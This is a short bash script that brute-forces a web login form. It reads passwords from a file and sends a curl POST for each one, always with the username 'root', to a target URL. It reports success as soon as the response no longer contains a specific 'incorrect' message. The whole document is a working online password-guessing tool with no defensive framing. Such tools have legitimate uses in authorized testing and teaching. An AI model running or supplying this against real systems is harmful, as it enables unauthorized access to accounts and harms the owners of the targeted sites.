#!/bin/bash

# Check if the target URL and password file are provided as arguments
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <password_file>"
    exit 1
fi

# Assign arguments to variables
url="$1"
password_file="$2"

# Username to use (can be hardcoded or modified for dynamic input)
username="root"

# Check if the password file exists
if [ ! -f "$password_file" ]; then
    echo "Password file '$password_file' not found!"
    exit 1
fi

# Display the input details
echo "Target URL: $url"
echo "Reading passwords from: $password_file"

# Iterate through each password in the password file
while IFS= read -r password; do
    # Check if the password is empty (skip empty lines)
    if [ -z "$password" ]; then
        continue
    fi

    echo "Trying password: '$password'"

    # Send the POST request with the current password and capture the response body
    response=$(curl -s -d "userName=$username&password=$password" "$url")

    # Check if the response contains the failure message
    if [[ "$response" == *"Sorry, your Username and/or Password is incorrect"* ]]; then
        echo "[FAILED] Username: $username, Password: '$password'"
    else
        echo "[SUCCESS] Username: $username, Password: '$password'"
        exit 0  # Stop after finding a valid password
    fi

done < "$password_file"

echo "Password brute-force complete."
